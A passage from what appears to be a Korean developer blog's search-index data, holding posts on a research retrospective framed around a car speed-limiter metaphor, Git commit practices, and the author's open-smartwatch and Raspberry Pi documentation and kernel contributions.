세션으로 접속하기세션에서 나가는 방법은 Ctrl + a 그리고 d 를 연속적으로 누른다.출처https://dreamlog.tistory.com/470" }, { "title": "자동차에 걸린 과속 방지 장치", "url": "/posts/quarter-1-hidden-card/", "categories": "develop-diary, research-diary", "tags": "android, mobile, linux, research, system", "date": "2023-03-16 00:00:00 +0900", "snippet": "들어가며지난 영화는 다시 봐도 다른 느낌으로 다가오고 당시에 보지 못했던 장면이나 인물들의 감정 그리고 인상 깊었던 대사를 다시 한 번 시청하면서 감동을 받을 수 있다.영화를 보다보면 감독이 의도한 부분에 의해 조금씩 다른 영화가 있다. 미션임파서블, 스파이더맨 등이 그런 경우다. 시리즈인데 만든 감독이 다르다. 물론 전체 맥락은 똑같거나 비슷하게 갈...", "content": "들어가며지난 영화는 다시 봐도 다른 느낌으로 다가오고 당시에 보지 못했던 장면이나 인물들의 감정 그리고 인상 깊었던 대사를 다시 한 번 시청하면서 감동을 받을 수 있다.영화를 보다보면 감독이 의도한 부분에 의해 조금씩 다른 영화가 있다. 미션임파서블, 스파이더맨 등이 그런 경우다. 시리즈인데 만든 감독이 다르다. 물론 전체 맥락은 똑같거나 비슷하게 갈 수 있지만 중간 중간 스토리에서 들어가는 상황이나 주인공의 내면 갈등 그리고 전체에서 느껴지는 분위기가 조금씩 다르게 반영될 때가 있다.23년 1분기 첫 회고는 같은 소재를 다른 눈높이로 바라보며 보이지 않던 숨겨져 있는 어떤 것을 발견함에 대한 회고로 시작하려고 한다.자동차에 걸린 과속 방지 장치새롭게 만드는 자동차에선 과속 방지 장치를 의무적으로 장착하고 만들게 된다. 과속으로 인하여 예기치 못한 사고가 일어나거나 큰 사고가 일어날 수 있는 상황을 대비하고자 하는 만든 이의 뜻이 보인다. 그러나 일정 이상 속도를 내고 싶은 사용자들도 있고 수준 이상의 속력을 내야 하는 상황이 있다. 하지만 자동차를 부품과 시스템을 주는 회사에서 이미 과속을 차단하는 의미로 과속 방지 장치를 보급한 이상 이것을 받아 만드는 모든 자동차는 과속 방지 장치가 장착한 상태로 시중에 나오게 된다.우리는 이러한 과속 방지 장치를 무효화하여 속력을 낼 수 있는 방법을 찾아야했다.정면 승부가 아닌 인사이트 승부인터넷에서 인상적이게 본 사진 한 장이 있는데 차단봉으로 길을 막아놓았는데 사람들이 그 옆으로 지나가는 유쾌한 사진이다. 결국은 차단봉이 의미가 없는 것이었다.과속 방지 장치 역시 이러한 것이 아닐까 싶다. 정면 승부로 과속 방지 장치를 어떻게 해본다면 어렵겠지만 다른 방법으로 속력을 낸다거나 과속 방지 장치가 속력을 감지하는 방법 외에 기타 방법 등이 있을 거 같다.혹시나 이러한 일을 대비해서 어렵게 과속 방지 장치를 만들어도 결국 그 시스템을 상층부로 따라가보면 무엇으로 속력을 감지하고 알아채는지 알 수 있다. 우린 그 부분을 핵심으로 잡고 다른 방법으로 속력을 내면 되는 것이다.정리하며1분기는 연구에 꽤 많은 시간을 투자했다. 처음 해보는 작업이나 사용하는 툴들이 많았지만 조금씩 하다보니 익숙해지고 방법도 터득했다. 앞으로는 더 다양한 기술들을 연구해볼 생각이며 추후 또 이번과 같은 난제가 오기 전에 여러 기술들과 툴 사용법을 미리 익히고자 여러 코드들을 참고하고자 한다.처음 이 직업을 통해 부딪힌 첫 결전이었으며 개발자의 의도와 생각을 이해하면서 코드를 본 시간이었다. 세상엔 완벽은 없고 어딘가 분명 틈이 존재하며 이 틈을 찾기까지 우리가 가진 능력이 시험대에 서는 기분이었다." }, { "title": "잔디 컨퍼런스", "url": "/posts/git-conference/", "categories": "life", "tags": "community, git", "date": "2022-12-17 00:00:00 +0900", "snippet": "잔디콘올해 코로나 때 참가하고 있던 개발자 커뮤니티에서 컨퍼런스를 개최하였다. 이때 발표 세션으로 참가하여 취준 때 인생을 갈아넣은 오픈소스 관한 이야기에 대해 세션을 맡았다. 코드 병합부터 Release 배포까지 많은 과정을 어떻게 간단하게 진행할 수 있었고 Git을 어떻게 하면 편리하게 최대한 활용할 수 있는지 정리하여 요약하는 세션도 가질 수 있...", "content": "잔디콘올해 코로나 때 참가하고 있던 개발자 커뮤니티에서 컨퍼런스를 개최하였다. 이때 발표 세션으로 참가하여 취준 때 인생을 갈아넣은 오픈소스 관한 이야기에 대해 세션을 맡았다. 코드 병합부터 Release 배포까지 많은 과정을 어떻게 간단하게 진행할 수 있었고 Git을 어떻게 하면 편리하게 최대한 활용할 수 있는지 정리하여 요약하는 세션도 가질 수 있었다. 처음으로 가져보는 발표 세션이라 조금 긴장했지만 개발 컨퍼런스라 재밌는 내용으로 구성되었다.간단하게 요약하자면 코드에 개선 사항을 Pull Request로 보내면서 하나씩 수정사항을 리뷰한 끝에 병합되었고 결국 코드 메인테이너 권한까지 획득한 배우고 느낀 점을 나눠보았다.오픈소스를 도전하고 그 열매를 맺기까지 걸린 시간과 노력 그리고 거기서 얻은 유대감 등 많은 이야기를 다뤘다.참석 전에 다른 약속 시간과 겹쳐서 시간을 놓칠 뻔 했는데 다행히 늦지 않게 잘 도착하였다. 코드 컨트리뷰션을 진행할 때 코드리뷰와 PR을 보내게 되는데 몇번의 과정을 거치면서 어떤 것이 코드를 깔끔한 방식인지 알 수 있게 된다. 우리가 커밋할 때 남기는 메세지나 코드 라인 diff는 단순하게 장난 반 진심 반으로 저장_수정최종2_수정 이런 불상사를 막고자 하는 취지도 있지만 가장 큰 이유는 우리가 컨트리뷰션할 때 변경 사항을 가장 정확하고 군더더기 없이 관리하기 위함이 가장 큰 것으로 여겨진다.PR을 남길 때 우리는 흔히 Update Readme 이런 식으로 파일의 변경 사항이 어떻게 변경되었는지 두리뭉실하게 기입하곤 한다. 이때 훗날 제 3가 볼 때 어떤 변경 사항이 있었는지 메세지만 보고서는 알 수 없으며 추후 유지보수 할 때 난관이 지속된다.또한 커밋할 때 데드코드를 같이 커밋하는 상황이 빈번할 수 있는데 이때 이러한 코드를 같이 커밋하는 것 역시 git을 쓰는 이유가 무의미해지게 만든다.if (test_value != null){ // sample(); run();}위에 예시처럼 주석처리해서 올라가는 경우가 있는데 이때 코드 관리와 시각성을 해치게 된다. 커밋하는 목적은 어떤 시점에 어떤 변경 사항이 생겼는지 제 3자가 깨끗하게 보게 하기 위함이다.데드코드를 커밋하는 것은 이후 코드를 볼 때 시각성과 가독성을 해치는 원인이 될 수 있다. 만약에 데드코드를 만들지 않으려면 어떻게 해야 할까if (test_value != null){ sample();}만약 위와 같이 이러한 코드가 있다고 가정한다면 아래 코드로 바꾼다고 가정해보자if (test_value != null){ run();}sample()이라는 함수 대신 run()이라는 함수로 대체하였다.추후 sample()이라는 함수를 다시 복구하고 싶을 수 있지 않냐고 한다면 diff로 확인해보면 된다.if (test_value != null){- sample();+ run();}위와 같이 커밋을 하면 어떤 변경사항이 생겼는지 코드 단위로 글자 단위로 커밋된다.추후 이전 커밋으로 해당 코드를 복구하면 깨끗하게 데드코드 없이 원하는 코드만 확인할 수 있는 셈이다.또한 커밋메세지 역시 단순하게 Update new file 이런식으로 하면 어떤 변경 사항이 있는지 확인하기 어렵다.앞에서 언급한 것과 같이 데드코드를 염두하고 코드 한 줄 한 줄 관리한다면 아래처럼 커밋메세지도 관리할 수 있다.core: change function method to run()- Change the sample() method to run() method to improve itdiff --git a/coreFile.c b/coreFile.cindex gey23e3..ie9023e 100644--- a/coreFile.c+++ b/coreFile.c@@ -89,7 +89,7 @@ comments:if (test_value != null){- sample();+ run();}위와 같이 커밋메세지와 커밋기록을 관리한다면 추후 PR을 할 때 보다 빨리 검토할 수 있으며 잠재적인 버그도 쉽게 잡을 수 있다고 본다. 커밋은 프로젝트가 진행하면 진행할수록 애자일스러울수록 관리하기 어렵고 확인하기 번거로워진다. 이때 주기적으로 또 코드를 커밋할 때 부터 깨끗하게 관리한다면 Release 할 때 Review 및 Merge 작업이 더 수월해진다고 본다.또 컨트리뷰션은 코드를 사랑하는 마음 아닐까 싶다. 이것에 관련해서는 Raspberry Pi 커뮤니티에서 기술 문서에 대한 Contribution을 진행하였다. 제 3자가 읽을 때 이해할 수 있게 작성하고 해당 서비스에 대해 리딩만으로 완벽하게 이해할 수 있게 하는 것이 기술 문서의 존재 이유라고 생각한다.초기에는 리눅스 커널 빌드하는 페이지를 컨트리뷰션하였다. 검색을 할 때 중간 과정이 잘렸거나 특정 과정에 대해 자세히 언급 안 된 문서들이 대개 많다. 그리고 그 정보를 위해 또 다시 서브적으로 검색이 필요한 순간이 많다. 이러한 부분이 해당 빌드 페이지에 있었다. 물론 초보자라 발견하기 쉬웠을 수 있다. 해당 페이지에 특정 명령어를 추가하는 방식으로 PR을 보냈는데 수차례의 의견 수정 끝에 메인테이너가 방향을 제시해줬다.이후에도 기술 문서를 보면서 부족한 내용들을 컨트리뷰션하였고 기술 문서 전반적으로 typo도 캐치하였다. 이때 가장 의미 있었던 것이 기술 문서에는 우리가 알고 모르는 다양한 typo가 숨어있다. 또한 이러한 typo를 찾기 위해 기술문서 전반을 숙지해야 하는 어려움이 있을 수 있다. 컨트리뷰션 한다는 것은 어떻게 보면 코드를 사랑하기 때문에 가능한 것이라고 본다. 수많은 코드 속에서 수정사항이 필요한 코드를 찾고 이걸 수정하여 컨트리뷰션 하는 것 까지 굉장히 귀찮은 일이 아닐 수 없다.오픈소스 프로젝트를 보다보면 어떤 코드를 어떻게 사용해야 할지 경험해가는 것 같다. 처음부터 규모있는 서비스를 밑바닥부터 코드를 작성하는 것이 아니라 오픈소스로부터 필요한 코드를 서치하고 그걸 원하는 모습으로 현재 사용하고 있는 서비스나 모듈에 잘 이어주는 작업을 보다 손쉽게 할 수 있도록 학습할 수 있는 시간이다.지난 시간을 돌아보면 오픈소스를 시작한 여정은 쉽지 않았다. 지구 반대편에 있는 사람들과 다른 시간대에서 얘기하는 것은 어려웠고 언어에서 원활한 소통까지 쉬운게 하나 없었다. 이 시간들을 즐기면서 할 수 있었던 이유는 그 당시에 진행했던 프로젝트를 사랑했고 또한 커뮤니티와 어울리고 싶은 마음이 어려움보다 컸기 때문에 가능했던 게 아닌가 싶다.앞으로 로드맵이 있다면 사용하고 있는 저명한 프레임워크나 툴에 기여하고자 한다. 사용하는 소프트웨어를 계속 수정하면서 개선하고자 한다." }, { "title": "Open-smartwatch 릴리즈하기", "url": "/posts/deploy-OSW/", "categories": "open-smartwatch, develop-diary, contribute", "tags": "open-smartwatch, develop", "date": "2022-05-17 00:00:00 +0900", "snippet": "Open-smartwatch 회고OSW팀에 정식으로 합류한 지 얼마 안 되었지만 컨트리뷰션을 시작한 후 1년이라는 시간이 지났다.그간 얼마나 성장을 했을지 그리고 더 많이 배울 수 있는 장을 넓힐 수 있었는지 기록해보려고 한다.이 인연은 SNS에서 관심 있는 분야를 태그해서 구독하면서 시작했다. IOT나 웨어러블 등 디바이스 같은 것에 관심이 많아 태...", "content": "Open-smartwatch 회고OSW팀에 정식으로 합류한 지 얼마 안 되었지만 컨트리뷰션을 시작한 후 1년이라는 시간이 지났다.그간 얼마나 성장을 했을지 그리고 더 많이 배울 수 있는 장을 넓힐 수 있었는지 기록해보려고 한다.이 인연은 SNS에서 관심 있는 분야를 태그해서 구독하면서 시작했다. IOT나 웨어러블 등 디바이스 같은 것에 관심이 많아 태그를 했었고 언젠가부터 손목시계를 하드웨어부터 빌드하는 게시글이 눈에 들어왔다.이는 호기심을 사기에 충분했고 바로 프로젝트에 참여하고자 정보를 수집하였다.그 전에 한가지 설명하고자 하는게 있는데 개인 손목시계 프로젝트를 진행했었다.하드웨어는 기성품을 사용했었으나 코드는 처음부터 작성하였다.지금 생각하기로 가장 어려웠던 부분은 GUI 부분과 블루투스 개발 부분이었다.추후 손목시계를 앱이랑 연동하여 알림을 알려주는 용도로 확장하였다.이러한 프로젝트를 하고 느낀 것은 혼자서 하는 것도 같이 하는 프로젝트 속에서 더 성장할 수 있다는 믿음이 생겼다 혼자서 개발을 진행하니 코드나 아키텍쳐나 올바르게 진행하고 있는지 확신이 생기지 않았다.협력자로 함께하면서 코드를 좀 더 자유롭게 병합할 수 있었고 본격적인 개발을 시작할 수 있었다.지난 1년동안 프로젝트를 사용하면서 개선하고 필요한 기능들을 구체화하였다. 사용자 입장에서 그리고 개발자 입장 한 층 더 다가갈 수 있었다.컨트리뷰터를 시작하면서 코드 분석 또한 어렵고 이 팀에서 내가 무엇을 할 수 있을지 고민을 했었는데 1년 동안 컨트리뷰터로 활동하면서 코드 기여 방법, 코드 분석, 개선 방향 등 다각도로 분석할 수 있었다.개발자 입장에서 끊임없이 기능을 추가하는 것도 좋지만 사용지의 의견을 귀 기울이면서 사용자 입장에서 프로젝트를 바라보는 것에 중요성을 알게 되었다.Contributor에서 Collaborator오픈소스 활동을 하면 컨트리뷰션을 하게 되고 협력자로 업그레이드(?)할 수 있었다.지나온 시간을 기록해보면서 어떻게 컨트리뷰션을 진행하고 어떻게 콜라보레이터로 함께할 수 있었는지 되돌아본다.컨트리뷰션 방법오픈소스 컨트리뷰션에는 여러가지 방법이 있어서 아래 링크를 참고하기 바란다. Reference : Contribution type컨트리뷰션은 대부분 시작하는 개발자나 Github를 하는 사람이라면 한 번은 해보고 싶은 활동이다. 본인 역시 해당하였고 어떻게 시작하고 어떻게 확장해 나갈지 고민이 궁금했다.시작은 가장 가볍게 시작한다. 대부분 공통적으로 시작한 컨트리뷰션 2가지를 소개한다.오타찾기(Typo)가장 쉽게 그리고 가볍게 접근할 수 있지만 프로젝트나 문화에 따라 받아들여지지 않는 저장소도 있다. 본인의 경우 가장 즐겨 사용하던 오픈소스 하드웨어 플랫폼 공식 문서에서 오타를 찾거나 교정하는 작업을 시작으로 컨트리뷰션을 진행했다. 오타를 찾는 컨트리뷰션을 꾸준히 진행하여 탑 컨트리뷰터로 자리 잡을 수 있었고 이를 계기로 소스코드나 문서를 볼 때 자세하고 상세하게 보는 습관을 가질 수 있었다. 또한 공식 문서를 보는 습관을 들여 어떤 프로젝트를 진행할 때 항상 레퍼런스를 참고하여 개발에 원만한 진행을 도모했다. 개발자의 컨트리뷰션은 단연 기능개선이나 기능추가 등 소스코드를 작업하는 부분이라 생각한다. 추후 관심있는 저장소를 찾아 프로젝트를 사용하면서 기능추가/개선/성능향상 및 발견되지 않은 버그를 찾는데 주력을 가하고 있다.번역하기(Translate)국제적인 저장소이며 문서나 사용자와 커뮤니케이션이 있는 저장소라면 없을 수 없는 컨트리뷰션이다. 이는 로컬 사람만 할 수 있는 컨트리뷰션으로 꼽힌다. 공식 문서, 사용법 등 다양한 국적을 가진 사람들을 서포트하기 위한 프로젝트라면 꼭 존재하고 꼭 필요한 컨트리뷰션이다.소의 꼬리만 보기누구나 타인의 코드를 보면 이해하기까지 짧지 않은 시간이 걸린다. 그것이 규모가 커지면 커질수록 코드를 이해하는데 어느정도의 노하우를 요구하게 된다. 본인 같은 경우 규모 있는 프로젝트에 참여하려고 시도했다가 포기한 적이 몇 번 있다.이때 한 가지 분야를 정해서 파고드는 것이 도움이 된다. 전체를 파고드는 것은 추후에 진행하고 버그가 있는 부분을 찾아서 들어간 다음에 앞뒤 코드를 살피면서 어디랑 연결되었는지 하나씩 해석하면서 버그를 색출하는 것이다.이때 필요한 부분이 2가지가 있다.도메인 지식언어나 프로그래밍을 위한 베이스 지식이 필요하다. 단순하게 프로그래밍 지식을 요구하는 부분도 있으나 컴퓨터공학 지식, 깊은 하드한 분야던가 아키텍쳐 등 다방면의 도메인을 알아야 잡을 수 있는 버그도 존재한다.프로젝트 지식해당 프로젝트가 어떻게 작동하고 어떤 Input을 Output으로 바꾸어 표시하는지 알아야한다. 보통 소스코드를 보면 직관적으로 바라보고 해석해야 한다. 각각 문법적으로 코드를 바라보면 이해하기 어려워 프로젝트가 어떻게 작동하고 구성되었는지 파악한 뒤에 역으로 코드를 분석하여야 한다. 그 뒤에 마지막에 코드를 깊게 파고들면 이해와 분석의 속도는 이전의 배가 된다.소를 이끄는 방법프로젝트에 발견되지 않은 버그들을 찾아 메인테이너/오너와 함께 문제들을 하나씩 바로 잡았다. 본인 같은 경우는 프로젝트를 직접 사용해보는 병적인 증세가 있다. 사용하면서 바라보는 것은 2가지 사용자 입장에서 사용하는 것과 소프트웨어 엔지니어 입장에서 사용하는 것이 있다. 사용자 입장에서 바라본다면 사용자의 니즈를 파악할 수 있고 엔지니어 입장에서 사용한다면 코드 최적화나 버그를 발견할 수 있다.협력자가 되다.오랜 기간 지속적인 PR과 메인테이너를 괴롭힌 끝에 협력자로 등극할 수 있었다. Merge 권한을 가질 수 있게 되었으며 또 저장소에 전반적으로 영향을 미칠 수 있게 되었다. 이 말은 나의 행동과 코드에 신중하고 책임감 있는 행동을 기대하게 만든다. 메인테이너는 지금껏 보내왔던 Pull-request를 보며 코드를 평가해줬으며 실질적으로 저장소에 기여한 수많은 버그 색출 및 성능 향상과 더불어 많은 기여를 높이 평가하여 Merge 권한을 부여했다고 한다.사실 올해 아니 작년 목표가 컨트리뷰터 하는 것이었는데 끝내 PR을 보내어 이러한 성과를 맺게 되어 보람차다.콜라보레이터 메인테이너 등극지속적인 Pull-request와 동시에 수많은 버그를 찾아내고 성능을 개선한 끝에 6월 9일 오전 12시 50분 기준으로 콜라보레이터로 등극하였다.코드리뷰를 진행할 때, git 충돌을 해결했을 때, 발견되지 않은 버그를 찾아냈을 때, 참신한 아이디어나 기능, 버그를 설명했을 때 메인테이너는 칭찬을 아끼지 않았다.앞으로 메인테이너로 함께하면서 프로젝트를 고도화하고 코드에 책임감과 퀄리티를 가지고 개발에 집중하고자 한다.오픈소스 프로젝트를 사용하면서 문제를 바라보는 시선은 2가지였다.소프트웨어 엔지니어 입장코드를 작성하고 다시 코드를 바라보면 다른 방식으로 작성할 수 있다. 이는 영화와 같다고 생각하는데 같은 영화라도 볼 때 마다 다른 인상과 감명을 주듯이 코드도 읽을 때 마다 다른 영감과 아이디어와 시선을 선사한다. 또한 이전에 찾지 못했던 발견되지 않은 버그를 찾을 수 있는 계기가 되기도 한다.분명 개발자는 이러한 목적을 기반으로 프로그래밍 하였는데 실제로 작동하는 것은 개발자 생각과 다르게 행동이 된다. 숫자의 매개변수라던가 논리의 오류로 Output이 원하지 않는 모습으로 표시되는게 허다하다. 그렇다고 컴파일 과정에 의존하기에는 컴파일하는 과정에서 이러한 문제가 발견되는 경우는 극히 드물다.사용자 입장초창기 손목시계를 만들 때 이런 생각을 했었다. “사용자가 DIY를 할 수 있게 만들면 좋지 않을까”..그러나 생각을 해보면 사용자는 크게 이런 부분에 관심이 없었다. 이러한 것을 서두로 말하는 이유는 완성된 프로젝트라도 프로젝트를 사용해보면 분명 부족한 부분이 있고 부족한 부분은 채워지고 과한 부분은 다듬어지며 사용자의 요구사항에 의해 바뀔 수 있다는 것이다.컴파일 과정에서는 문제가 없던 코드지만 실제로 써보면 코드 상에서 발견되지 않는 충돌이나 버그를 발견할 수 있었던 것 처럼 사용하다보면 이러한 기능이 있었으면 좋곘다고 느끼는 요구사항이 발생할 수 있고 다른 방식으로 고치거나 사용자 친화적으로 프로젝트를 다듬을 수 있다.오픈소스 기여자개발자가 코드로 세상에 기여한다는 것은 가장 큰 메리트가 아닐까 싶다.꾸준한 오픈소스 활동을 통해 더 나은 프로젝트들을 만들고 커뮤니케이션을 진행하고자 한다." }, { "title": "Raspberry Pi Contribution", "url": "/posts/raspberry-pi-contribution/", "categories": "git, opensource, raspberry-pi", "tags": "git, opensource, raspberry-pi", "date": "2022-03-11 00:00:00 +0900", "snippet": "Raspberry Pi Contributorgit 과 리눅스를 공부하면서 실제로 어떻게 쓰이는지 사용해봐야 하는데 밑도 끝도 없이 프로젝트를 하는건 수습하기 어려울 거 같아서 오픈소스에 참가하였다.Raspberry Pi에서 Contributor로 활동하며 협업 방법과 Linux Kernel에 접근하여 공부해가는 학습과정을 기록하였다.Raspberry ...", "content": "Raspberry Pi Contributorgit 과 리눅스를 공부하면서 실제로 어떻게 쓰이는지 사용해봐야 하는데 밑도 끝도 없이 프로젝트를 하는건 수습하기 어려울 거 같아서 오픈소스에 참가하였다.Raspberry Pi에서 Contributor로 활동하며 협업 방법과 Linux Kernel에 접근하여 공부해가는 학습과정을 기록하였다.Raspberry Pi 사용자 문서로 제품 특성이나 가이드라인을 포함한다. Raspberry Pi는 리눅스가 올라간 초소형 미니 컴퓨터로 리눅스 컴퓨터 사용 방법과 간단한 모듈에 대한 예제 코드들이 다수 포함되었다.라즈베리파이로 여러가지 프로젝트를 해보면서 문제를 해결하다보니 저장소에 기여하고자 공식 홈페이지에 들어갔다.커널 빌드하기까지Linux Kernel 에서 어떤 Pull Request를 할지 몰라서 하고 있던 Pi-Watch 프로젝트에서 Kernel을 빌드해보면서 구현한 자동화 스크립트를 Pull Request를 요청하였다. 답변은 굉장히 격식 있는 Close답변을 주어 보낸 Pull Request가 부끄러워졌다. 너무 성의없이 Pull Request를 요청한게 아닌가 느껴졌다.답변은 메인테이너가 기여하려는 마음을 따뜻하고 가치있게 봐준 점이 오픈소스 협업에 관한 열정을 더 높였다. 비록 Close되었지만 기여할 수 있는 부분을 논의하였고 커널을 빌드할 때 문제를 수정해주면 입문자들이 시작할 때 어디가 문제인지 쉽게 접근할 수 있다는 답변을 받았다.메인테이너가 권유한 방식대로 기술문서에서 Kernel 빌드할 때 트러블슈팅을 작성하려고 하였다. 프로젝트를 진행하면서 기존에 아는 방식과 다르게 기술문서를 따라해보면서 커널을 빌드해보았고 그 과정에서 처음 입문하는 사람들이 알 수 없는 부딪힐 수 있는 부분이 있을까 세세하게 확인하던 중 크로스 컴파일할 때 프로세서 갯수를 확인하는 부분이 구체적으로 명시되지 않아 수정하여 PR(Pull Request)를 요청할 수 있었다.커널 빌드 관련 Contribution기술문서에서 커널을 크로스 컴파일하는 과정에서 프로세서 갯수를 확인하는 명령어를 첨부하여 수정하였고 간단한 피드백을 통해 긍정적인 Merge 답변이 날라와 이에 힘 입어 지속적으로 수정을 거치고 있다.충분한 이해를 위해 기술문서 정독하기Rapsberry Pi를 사용한 지 2년이 훌쩍 다다른다. 처음 접할 때 여러 명령어와 익숙하지 않은 CLI 환경에 힘들었지만 조금씩 적응할수록 GUI보다 CLI 환경에 더 적응해가고 있다. 또한 GUI 환경에서 할 수 없었던 제한된 복합적인 기능을 명령어 한 줄로 구사하는 점이 매력적으로 다가왔다.커널을 빌드하고서 PR(Pull Request)를 요청한 지 약 3개월만에 리눅스 커널에 드디어 코드 한 줄을 기여하였다. 처음 시작은 Raspberry Pi 커널을 빌드한 결과 자동화 스크립트를 작성하여 요청하였으나 거부하였고 대신 기술문서 안에서 바로 잡을 수 있는 부분을 기여해달라는 답변을 받아 Raspberry Pi 기술문서에서 커널 빌드 부분을 작성하여 기였하였더니 Merge 와 함께 감사의 인사로 답하였다. 이때 힘 입어 기술문서에 다른 Command 사용에 관하여 기여를 하였고 Linux 환경 중점 보다는 Raspberry Pi 사용 중심으로 기여하고자 깊은 구성은 피했다. 그후 다시 리눅스 커널에 관한 드라이버 파트를 유심히 보다가 커널 config 부분에 코드를 기여할 수 있게 되었고 흔쾌히 Merge 답변을 남겨주었다.어느 커뮤니티에 말을 인용하자면 리눅스 커널이라는 영역은 평생을 공부해야 코드 한 줄을 기여할 수 있을까 말까 할 정도로 다 알 수 없을만큼 가치 있고 흥미로운 일이라고 한다. 어려운 시작, 낯선 시작이었지만 포기하지 않고 코드를 사랑하는 마음으로 꾸준히 기여하고자 한다.다른 것디바이스 드라이버에 관하여 구현해보려고 구글을 통해 간단한 테스트 문자 디바이스 드라이버를 구현하였다. 디바이스 드라이버 개발 규칙을 간단하게 살펴 예제를 시도해보았다. 관련된 건으로 Raspberry Pi Zero W를 SERVER로 사용하고 있는데 유선랜 포트가 없어 ENC28J60 모듈을 사용하여 이더넷에 연결하였다. 문서를 찾아보니 개발된 드라이버가 있어서 연결하여 호환이 가능한 것이었다.잠시최근 문서 기술 관해서 간단한 명령어 관해 PR을 요청하자 운영과 관련된 기술문서는 웹사이트에 더 자세하게 나와있어 앞으로 이와 같은 PR 요청은 받지 않는다는 답변을 받았다. 그래서 좀 더 다른 파트로 PR을 해보고자 쉬면서 커널 부분과 기술문서를 차근차근 살펴보려고 한다.이름 쓸 줄 모르는 이상한 곳Pull Request를 진행하다보니 Raspberry Pi 오타가 빈번하게 많은 걸 발견했다. 메인테이너들이 유쾌하게 받아치길 이곳은 철자를 쓸 줄 모르는 사람들만이 일을 할 수 있는 자격을 가질 수 았다고 한다.기술문서 내에 철자 틀린 부분이 몇가지 있었다. 그 후 또 찾을 수 있었다. 여기서 유머러스하게 답변한 것을 보고 유쾌한 곳에 속해있다는 것을 알았다.얼마 후 나도 드디어(?) 자격을 얻었다.이쯤이면 오타를 즐기는 것 같고 우연찮게 오타를 내면 유쾌하게 받아칠 수 있는 것 같다.Top ContributorOpen source community에 매일 1 - contribution을 진행한 결과 탑 컨트리뷰터 리스트에 오르게 되었다. 첫 시작은 커널을 빌드하는 과정에서 자동화 스크립트를 작성하였지만 Collaborator가 다른 사람들이 커널에 관하여 문제 해결을 쉽게 할 수 있도록 가이드를 잡아달라고 요청하여 기술문서로 방향을 바꿨다. 첫 커널을 빌드할 때 기술문서를 충분히 숙지하고자 여러번 정독하였는데 이때 크로스 컴파일 진행할 때 코어 갯수를 확인하는 명령어 설명이 부족하여 이를 시작으로 조금씩 기술문서 내에 교정 문구와 오타들을 바로 잡았다.덕분에 Git 명령어를 친숙하게 사용할 수 있게 되었고 PR을 하면서 필요한 옵션과 일어날 수 있는 충돌과 요구사항에 맞게 자유자재로 명령어를 다루어 commit을 진행해볼 수 있었다.문서 개편이었나의미있는 커밋을 진행하고자 한다. 물론 매일 기술문서에서 보완할 것을 찾는 것도 좋지만 더 의미있는 가치있는 PR을 남겨보고자 한다.남겨진 코멘트를 참고하여 의미없는 변화를 추구하지 않도록 기여해야겠다.Raspberry Pi Imager 한글화Raspberry Pi Imager 공식 한글화를 진행하였다. 라즈베리파이 프로젝트를 하면서 많이 찾아본 것은 다름 아닌 관련 기술문서다. 기술문서를 통해 라즈베리파이를 어떻게 사용하고 어떤 방식으로 구성되었는지 알아보기에 좋은 레퍼런스이다. 당시에는 Raspberry Pi 프로젝트를 하려면 먼저 운영체제를 SD카드에 설치하기 위해 카드를 포맷하고 다시 카드에 쓰기까지 몇번의 과정을 거쳐야 했어서 번거로운 것이 없지 않아 있었다. 우연히 오픈소스 컨트리뷰션을 하다가 Imager 번역 컨트리뷰션을 알게 되어 한글화를 진행하였다. 단순하게 번역 자체 의미는 없지만 어떤 툴이나 플랫폼을 쓸 때 우리말이 지원된다는 건 기쁜 일이다. 항상 그 뒤에 누군가 번역해준다는 사실을 모르고 있었는데 이번에 Raspberry Pi Imager를 번역하면서 지금까지 사용해왔던 툴이나 프로그램에서 우리말이 지원되기까지 수고해주신 보이지 않는 분들의 손길이 감사했다.프로그래밍을 배우고 자라나는 친구들이 한번쯤 쓰고 지나친다는 Raspberry Pi, 내가 번역한 한글화 버전을 쓴다는 생각에 더 신경써서 번역해야겠다.기여자 몰색하기https://github.com/raspberrypi/documentation/pull/2601#discussion_r930905709누군가 컨트리뷰션을 할 수 있게 오타를 수정하지 않고 냅뒀다. 다른 사람이 컨트린뷰션을 할 수 있도록 열어둔 셈이다. (하지만 담당자가 수정했다.)컨트리뷰션을 하면서 느낀 것은 오픈소스는 정말 무섭고 위대한 단체라고 생각한다. 비록 페이나 보상이 없어 순수한 마음이 아니라면 동기부여가 어렵지만 이 말은 마음만 있다면 어떤 코드 간에 개선과 패치 그리고 bug fix 는 멈추지 않는다는 것이다. 조금 느리더라도 누군가에 의해 코드는 개선되고 후에 더 나은 모습으로 무서운 속도로 성장할 것이라고 본다." }, { "title": "Open smartwatch Contribution", "url": "/posts/OSW/", "categories": "osw, develop, contribution", "tags": "osw, develop", "date": "2022-03-07 00:00:00 +0900", "snippet": "Open-smartwatch CollaboratorOpen-smartwatch 커뮤니티에 참여하며 Pull request와 Issue를 등록하였으며 Contributor로 활동하는 개발/문제해결 이야기를 기록하였다.IntroSNS에서 IOT/Embedded 관련한 작품을 종종 보면서 다음에 만들어 볼 버킷리스트로 기록을 하거나 호기심에 수집하는 취미가...", "content": "Open-smartwatch CollaboratorOpen-smartwatch 커뮤니티에 참여하며 Pull request와 Issue를 등록하였으며 Contributor로 활동하는 개발/문제해결 이야기를 기록하였다.IntroSNS에서 IOT/Embedded 관련한 작품을 종종 보면서 다음에 만들어 볼 버킷리스트로 기록을 하거나 호기심에 수집하는 취미가 있다. 근래 흥미를 끈 손목시계가 있었다.현 26명의 개발자(11/17/2021)로 이뤄져 Open-source 기반의 오픈 스마트워치를 구성하고 있다.스마트워치에 기능 개발과 버그 트러블슈팅 분야에 전력을 가하고 열거된 Issue들을 처리하고 있다. 또한 개선할 수 있는 부분들을 확인하고 있고 새로운 도메인들과 지식의 범위를 넓혀가고 있다.Contribution처음으로 수락된 Pull-request, 어렵지 않았지만 방법을 잊지 않기 위해 매일 Pull-request를 진행하였고 메인테이너가 요구하는 커밋 형식과 메세지에 맞춰서 Pull request를 제출하고자 검색하여 옵션 명령어들도 숙지하였다. 한 번 사용으로 끝나는 게 아니라 여러 차례 사용해보면서 특징을 파악하여 다른 상황에서도 활용할 수 있도록 응용해나갔다.Git 사용법은 언어랑 같아서 자주 사용하지 않으면 둔해져서 일부러 Git을 공부하고 자주 쓰는 패턴을 정리하였다.오픈소스 활동을 하면서 단순한 Git 패턴이 아니라 갖가지 사고에 대응할 수 있게 여러 방면의 옵션들과 명령어들을 확인할 수 있었다.Assignees로 등록등록된 새로운 Watchface 구현, 화면 요소 겹침 문제 2개 이슈에 관하여 진행자로 할당 받았다.스스로 문제를 해결하고자 코드를 분석해보았고 프로젝트를 수차례 사용해보면서 근본적인 부분을 